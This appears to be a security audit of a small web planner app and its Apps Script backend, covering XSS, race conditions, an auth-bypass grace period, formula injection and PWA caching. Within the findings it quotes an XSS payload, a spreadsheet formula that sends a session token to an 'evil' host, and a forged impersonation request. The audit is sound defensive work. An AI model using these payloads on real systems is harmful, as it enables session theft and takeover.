## תקציר בעברית (לקריאה מהירה)

בדקתי את כל האפליקציה — קוד צד־לקוח, קוד השרת (Apps Script), נגישות, עיצוב ורספונסיביות — מעבר למה שכבר מתועד ב(NOTES.md). המערכת בנויה היטב ורוב מה שתועד כבר טופל, אבל צפו כמה ממצאים **חדשים ומהותיים** שלא היו מוכרים:

1. **החור הכי חמור — הזרקת קוד (XSS) דרך שם של איש צוות או מופע.** אם עורך יוצר איש צוות ששמו מכיל תגית (HTML) זדונית, הקוד רץ אצל כל מי שפותח את תצוגת "המשימות של כל אחד". אומת מהמקור. (בארגון קטן ומהימן הסיכוי נמוך, אבל ההשפעה — השתלטות על הסשן/הלוח — גבוהה.)
2. **דליפת נתונים בין לוחות.** אם מחליפים לוח בדיוק כשעדכון רקע מהשרת עדיין בדרך, התשובה של הלוח הישן יכולה לדרוס את הלוח החדש בזיכרון ובמטמון — ואז השמירה הבאה דורסת את הנתונים האמיתיים של הלוח החדש.
3. **צד השרת — "דלת אחורית" בתקופת החסד.** כל עוד (REQUIRE_AUTH) כבוי, כל אחד יכול לשלוח (email) של עורך אמיתי ולשנות את הגדרות המערכת (כולל להחליף את מזהה גוגל ולהכניס את עצמו כעורך) — שינוי ששורד גם אחרי שמדליקים את הדרישה להתחברות. זו סיבה טובה לבדוק את יומן ה(Log) לפני שמדליקים.
4. **הזרקת נוסחאות ל(Google Sheets).** שם לוח / (email) / רשומת יומן שמתחילים ב־`=` נשמרים כנוסחה חיה בגיליון — ובן־אדם שפותח את הגיליון עלול להריץ אותה בטעות (למשל נוסחה שמדליפה טוקן סשן).
5. **תקלת ה(PWA) שדיווחת עליה — אומתה.** האתר מוגש עם מטמון של 10 דקות ובלי (service worker), ולכן חלון (PWA) שנשאר פתוח ימים לא מקבל גרסאות חדשות ואין בו כפתור רענון. יש פתרון קליל שלא דורש תמיכת (offline) — פירוט בהמשך.
6. **נגישות מקלדת** — התפריטים הנפתחים (בחירת איש/מופע/יום, תפריט "⋯" ברשומות) לא נגישים כלל למקלדת, ואין סימון פוקוס על שדות עריכה.

בהמשך: פירוט מלא לפי תחום, הפרדה בין ממצאים חדשים לבין אישור של דברים שכבר ידועים, וטבלת עשרת המובילים.

## Domain 1 — Code correctness & security

### New findings

**C1. [critical · src] Stored XSS via person/topic name in the weekly digest.**
`index.html:2830` `head.innerHTML = (icon||'') + '<span>'+name+'</span><span class="summary-group-count">'+items.length+'</span>';` — `name` is a person/topic name that enters completely unescaped at `index.html:3316` `const item = {id:uid(), name:val};` (from a plain `<input>`, no sanitization anywhere on that path). Every other label in the file uses `textContent`; this one path concatenates raw into `innerHTML`.
- **Failure:** an editor creates a person named `<img src=x onerror="…">`; the payload executes for everyone who opens "המשימות של כל אחד"/"לפי מופע" (default-visible), with `currentSession`/`appState` in scope → session/board takeover.
- **Verified:** both ends quoted from source; the input→innerHTML flow is unbroken. (Not detonated live — the disposable board wasn't left with a payload.) Same raw-name pattern also at the topic clear-confirm `confirm('… '+name+' …')` (2838, text-only, harmless) — the innerHTML at 2830 is the live vector.
- **Context:** editors are already trusted in a tiny org, so likelihood is low — but the fix (swap to `textContent`/escape) is one line and closes a real takeover path (compromised account, or a viewer ever promoted).

**C2. [critical/high · code-race] Cross-board state clobber when a poll response outlives a board switch.**
`refreshFromServer` reads `currentBoardId` into the fetch URL at `index.html:1516`, `await`s the response, then on resolve writes to the **global** `currentBoardId` at `1552` `localStorage.setItem(cacheKeyFor(currentBoardId), serverJson)` and `appState = serverData` (1537). Nothing captures the board id before the `await` and re-checks it after.
- **Failure:** poll for board A is in flight → user clicks board B (`switchToBoard`, `index.html:2170`) → A's response resolves, sees `serverJson !== lastSyncedJson` and no pending edit, and writes **A's data into board B's** in-memory state + localStorage cache, then `renderAll()`. The next edit saves A's content to the server as board B → permanent overwrite of board B.
- **Fix direction (do not implement yet):** capture `const boardAtStart = currentBoardId` at entry, bail if `currentBoardId !== boardAtStart` after each `await`. Same pattern needed in `pushState`.

**C3. [high · src] `switchToBoard` switches away even when the flush fails — silent unsaved-edit loss.**
`index.html:2174` `if(currentRole==='editor' && currentBoardId && hasPendingLocalChange) await pushState();` then unconditionally `currentBoardId = boardId`. The return of `pushState()` is never checked; its failure `setSyncStatus` is immediately overwritten by the new board's "מתחבר…". The in-memory edit is gone (only a stale localStorage copy for board A remains).

**C4. [medium · src] "החלפת משתמש" (logout) drops a pending edit.**
`index.html:5415` handler clears `currentSession` immediately without clearing `saveTimer` or awaiting `pushState()`; when the 600ms debounce fires, `pushState`'s own `if(!currentSession) return;` no-ops. An edit made in the last ~600ms before logout never reaches the server.

**C5. [high · src] Deleting a person/topic leaves dangling id references, contradicting its own dialog.**
`index.html:3273-3292` `doDelete` only splices from `people`/`topics`; it never walks `appState.weeks`/`unscheduled` to clear `personIds`/`topicId`. The confirm text promises "המשימות יישארו אך יאבדו את השיוך", but the tasks keep the dead id: excluded from the "ללא שיוך" bucket and from highlight-filtering, showing a broken chip, unclearable individually.

**C6. [medium · src] View-only role gating is CSS-only (`pointer-events:none`) and keyboard bypasses it.**
`index.html:709-718` blocks mouse but not keyboard focus/Space; `.task-text`/`.event-text`/`.day-banner` are `contentEditable='true'` regardless of role, and neither `makeEditable`'s commit nor the checkbox `onchange` checks `currentRole`. A viewer can locally "edit" via keyboard (writes to their own localStorage; `scheduleSave` blocks the server write, so blast radius = that tab until the next poll reverts). The notes editor gates this correctly (`4853`), so the planner side is the inconsistent one.

**C7. [critical · verify-live] Notes editor: drag-dropped external HTML bypasses `sanitizeInline`.**
`wireOutlineTextEvents` (`index.html:4922-4937`) wires `paste` (forced plain-text) but never a `drop`/`dragover` handler. Native HTML5 drag of a `text/html` payload into the contentEditable is inserted by the browser **before** any app code runs; the `input` listener's `sanitizeInline(el.innerHTML)` fires too late — an `<img src=x onerror=…>` executes on insertion.
- **Needs live repro:** build a local HTML file with the payload, drag its selection into a notes block, confirm `onerror` fires. High-confidence from source; flagged verify-live because the exact browser drop behavior should be confirmed before acting.

**C8. [high · src] `sanitizeNotesState` doesn't backfill missing `children`/`blocks`, so a malformed write crashes the page forever.**
`index.html:4531-4544` — `walk(b.children || [])` guards only the recursive call; it never assigns `b.children = b.children || []`. A block that reaches the client without a `children` key (non-client API write, old schema, hand-edited Sheet) still lacks it after "sanitization", and `renderBlockRow` (`4841` `if(block.children.length)`) throws `TypeError` on every open, for every user, permanently — precisely the defense this function is supposed to be.

**C9. [medium · src] Notes: Enter at offset 0 of a parent with visible children moves the whole text down a level.**
`splitBlockAtCaret` (`index.html:4624-4636`) `unshift`s a new child with the full `after` text when caret is at 0 and children are expanded — the parent is left blank and its text becomes the new first child, instead of a blank line appearing above.

**C10. [medium · src] Notes: undoing "delete last block" discards text typed into the auto-placeholder.**
`deleteBlockWithUndo` (`index.html:4811-4825`) — if the user types into the auto-added placeholder within the 6s window then hits "בטל", the guard `page.blocks.length===1 && page.blocks[0]!==removed` is still true and splices the placeholder out, losing the typed text.

**C11. [medium · code-race] Notes: poll suspended for the whole time a page is open → unbounded two-editor clobber.**
`isUserEditing()` returns true whenever *any* notes page is open (`index.html:1303`, `isNotesPageOpen` at `4550`), so `refreshFromServer` never overwrites while a page is open. Two editors on the same page diverge with no 20s reconciliation and no conflict surfacing; last debounced save wins silently. Worse than the documented "20s staleness is acceptable" trade-off because staleness is unbounded here.

**C12. [medium · live] No-access board shows an editable empty planner during the Apps Script cold-start, and the sync status never resolves.**
`[live]` Navigating (signed in) to a board you lack access to renders the default empty **editable** planner for the whole cold-start window (~11s measured), then `showNoAccess` (`index.html:1521`) correctly shows "אין לכם גישה ללוח הזה" — but `#syncStatus` stays stuck on "מתחבר…" indefinitely (never cleared by `showNoAccess`), and the week/month nav chrome remains above the message. Board-type resolution itself is fine for legitimate users (`1530` sets type from the server and re-renders).

## Domain 2 — Backend (Apps Script) security, concurrency, quota

### New findings

**B1. [critical · src] Grace-period backdoor that survives the `REQUIRE_AUTH` flip.**
`setScriptConfigForClient` (`קוד.js:243-252`) gates only on `resolveRole(LEGACY_BOARD_ID, callerEmail)==='editor'` and never rejects `auth==='plain'`. While the grace period is on, `resolveIdentity` (`847`) accepts any `email` param as that identity.
- **Failure:** anyone POSTs `{action:'setScriptConfig', email:'<a real board-1 editor>', key:'GOOGLE_CLIENT_ID', value:'<attacker client id>'}` → from then on `verifyGoogleIdToken` accepts the attacker's own Google tokens; they log in as any account, get a 90-day session, and can flip `REQUIRE_AUTH` back at will. Same impersonation can `setAccess` their address as editor (a Config row **not** undone by the flip). The Log records `GOOGLE_CLIENT_ID=(set)` with no value, so the swap is invisible in the audit trail.
- **Impact on the owner's plan:** "impersonation ends when I flip the flag" is not true. Before flipping, audit `Auth:'plain'` rows for `setScriptConfig`/`setAccess`/`setDefaultRole` **and** the Config tab. `[src]` verified.

**B2. [high · src] Formula/CSV injection into Boards/Config/Log — exploitable by an outsider during the grace period.**
`appendRowByHeader` (`קוד.js:458-467`) and `setValue` sites write user strings raw; `Range.setValue`/`appendRow` treat a leading `=`/`+`/`-`/`@` as a formula when a human opens the Sheet.
- **Failure:** `saveBoard` with `board:'=IMAGE("https://evil/?"&Sessions!A2)'` on any id → `logEvent(…,'forbidden',…)` writes that string into `Log.Board` (`1093`); opening the Sheet fetches the URL carrying a live session token from `Sessions!A2`. Same via board name (`createBoard`/`renameBoard`), `targetEmail` (`setAccess`, survives lowercasing), and `note`.
- **Fix direction:** a `safeCell()` that prefixes `'` on leading `= + - @`; email regex; cap name length/strip newlines. `[src]` verified on the write helper.

**B3. [high · src] Parse-failure / mid-write read returns a valid-looking empty board the client then saves over the real data.**
`getBoardState` (`קוד.js:541`, no lock) returns `defaultBoardState()` on `JSON.parse` failure (`564-570`) while `saveBoardStateRaw` writes chunks one `setValue` at a time. A read between the `State` and `State2` writes concatenates mismatched chunks → parse fails → empty board returned → client's `isValidStateFor` accepts `{}` → `flushPendingSaveOnExit` (`index.html:1482`, no `hasPendingLocalChange` gate) `sendBeacon`s the empty board back. Applies to any board >45k chars (every notes board per the storage doc). Recovery only from one browser's localStorage backup.

**B4. [high · src] Unlocked index-based `deleteRow` races the locked save.**
`deleteBoardRow` (`1184`), `deleteConfigRowsForBoard` (`1199`), `removeAccess` (`975`) take no `LockService`; `saveBoardStateRaw` resolves `rowNum` (`625`) then writes (`640`). A delete that shifts rows between another request's resolve and write makes the save land on the **wrong board's row**. Two concurrent `removeAccess` can delete the wrong Config row.

**B5. [high · src] Five whole-sheet `getDataRange()` reads remain, one on every save.**
`getHeaderRow` (`452`) does `getDataRange().getValues()[0]`, called by `appendRowByHeader` → every `logEvent` reads the entire Log tab; every `createBoardRow` reads all boards' full `State*` chunks (the exact pattern v17 claimed to remove). Also `renameBoardRow` (1149), `deleteBoardRow` (1179), `setDefaultRoleForClient` (992). Consistent with the 4-11s `createBoard` still observed after v17.

**B6. [medium · src] `listBoards` (polled every 20s/tab) is O(boards × sheets).**
`listAccessibleBoards` (`1043`) calls `resolveRole` per board, each doing a full `getConfigTable()` + `getBoardsTable()`. 6 boards × 10 tabs ≈ ~790 range reads per 20s tick; unbounded because `createBoard` has no per-account cap.

**B7. [medium · src] Unauthenticated `login` spam burns the daily UrlFetch quota → org-wide sign-in outage.**
`verifyGoogleIdToken` (`706`) calls `UrlFetchApp.fetch(tokeninfo)` before any local check. 20k junk `login` POSTs exhaust the 20,000/day consumer quota; every real login then fails for the rest of the day. Decode the JWT locally and reject bad `aud`/`exp` before fetching.

**B8. [medium · src] Audit trail is flushable by an outsider.**
`logEvent` fires on `forbidden`/`no_access` for any caller (`1057`, `1093`); `maybeTrimLog` drops the oldest 2,000 past 8,000. ~8,000 `saveBoard` attempts on `board-1` erase every real `login`/`setAccess`/`Auth:'plain'` row — including the rollout signal the owner needs before flipping `REQUIRE_AUTH`.

**B9. [medium · src] `getBoardState` chunk write can silently truncate + two edge cases.**
`ensureStateColumns` then reads `freshHeader` via `getLastColumn()` which "can lag" (own comment, `449`); if it misses the just-added `State2`, only chunk 1 is written but the **full-JSON hash is stored** (`644`) → every poll reports "unchanged" over unparseable state. Plus: `substring` at `618` can split a surrogate pair (emoji in notes `page.icon`/task text) at the 45,000 boundary → lone surrogate a cell can't hold → throw or U+FFFD corruption.

**B10. [medium · src] `debugSessions` leaks every staff email + session timing to any board-1 editor (= anyone during grace), and its `lastSeenAt` is misleading** (cache returns before the `LastSeenAt` update at `816`, so it advances once per 6h not once per hour). Temporary diagnostic — should be removed (NOTES already flags this).

**Lower:** logout/cache race can revive a session up to 6h (`792` before `802`); concurrent `setAccess` can create duplicate Config rows; `String(err)` leaks internal messages to the client (`110`,`183`); `maybeTrimLog` writes a Script Property on every event (`885`); session token travels in the GET query string (`authQuery`, exposed in any URL logging).

## Domain 6 — The PWA stale-code incident (owner-reported, now confirmed)

**P1. [high · live] Installed PWA windows never pick up new deploys and have no reload affordance.**
`[live]` measured on the live site: GitHub Pages serves both `index.html` **and the `./` that `manifest.start_url` resolves to** with `Cache-Control: max-age=600`, a weak `ETag`, and `Last-Modified`. **No service worker is registered** (`'serviceWorker' in navigator` is true, but the app never registers one — confirmed in `<head>`, which explicitly documents the no-SW decision). `manifest.webmanifest`: `display:"standalone"`, `start_url:"./"` with no cache-busting query.

**Why 10 minutes isn't enough in practice for a standalone PWA (the mechanism):**
- A normal tab re-requests `index.html` on every manual reload/navigation, so it re-validates within ~10 min of a refresh. A **standalone PWA window has no address bar, no reload button, and no pull-to-refresh** — the user rarely (never) triggers a top-level navigation. The document is fetched once at launch and the window then stays alive for **days**; the app never re-navigates (it only `fetch()`es the Apps Script API on the 20s poll — that keeps *data* fresh but never re-requests the *HTML/JS shell*).
- iOS adds two multipliers: standalone web apps are aggressively frozen/restored rather than reloaded when backgrounded, and WebKit's HTTP cache can hold a `max-age` resource well past nominal expiry when the app is never foregrounded through a real navigation. So the 10-minute `max-age` only matters at the *next top-level fetch* — which for an installed icon may simply never happen until the user force-quits or (their current workaround) deletes and re-adds the icon.
- Net: `max-age=600` bounds staleness for *tabs*, not for *installed standalone windows*. This is exactly the cost NOTES.md's "PWA manifest with no service worker" row predicted — now a confirmed live incident, not theoretical.

**Lightweight fixes that do NOT require offline support (for phase 2 to choose between — not implemented here):**
1. **In-page version check (no SW at all).** Ship a tiny `version.txt` (or a `<meta name="build">`) and have the existing 20s poll also `fetch('version.txt?t='+Date.now(), {cache:'no-store'})` every N polls; when it differs from the value baked into the loaded page, show a non-blocking "גרסה חדשה זמינה — הקישו לרענון" banner that calls `location.reload()`. Zero offline behavior, no cache of app code, no risk of serving stale code silently — it *detects* staleness and hands the user the reload button the standalone window took away. Smallest, safest, fits the no-build constraint.
2. **Minimal "network-first for the shell" service worker.** A ~15-line SW that does network-first for `index.html` (falling back to cache only when truly offline) and `skipWaiting`/`clients.claim`. Removes the staleness *and* survives a flaky connection — but reintroduces exactly the "SW serves stale HTML after deploy" failure mode NOTES rejected, *unless* it's strictly network-first. More power, more footgun; only worth it if offline-open is ever wanted.
3. **`Cache-Control` can't be set on GitHub Pages** (it's fixed at `max-age=600`), so a server-header fix is not available without moving hosting — ruling that out is itself a finding worth recording.

Recommendation for phase 2 to weigh: option 1 is the tightest match to this app's constraints (live-data, no build, no offline need). Flagged, not decided.
